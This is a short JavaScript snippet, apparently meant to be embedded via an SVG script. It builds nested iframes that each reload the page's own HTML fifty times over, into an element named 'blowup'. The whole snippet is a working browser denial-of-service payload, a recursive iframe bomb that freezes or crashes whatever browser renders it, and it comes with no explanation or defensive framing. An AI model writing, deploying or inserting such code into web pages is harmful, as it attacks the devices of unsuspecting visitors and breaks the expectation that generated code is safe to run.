svg.script:
const code = `<script>
  const d = document.createElement('div');
  document.body.appendChild(d);
  for (let i = 0; i < 50; i++) {
    const f = document.createElement('iframe');
    f.srcdoc = document.currentScript.ownerDocument.documentElement.outerHTML;
    d.appendChild(f);
  }
<\/script>`;

const div = document.getElementById("blowup");
for (let i = 0; i < 50; i++) {
  const frame = document.createElement("iframe");
  frame.srcdoc = code;
  div.appendChild(frame);
}
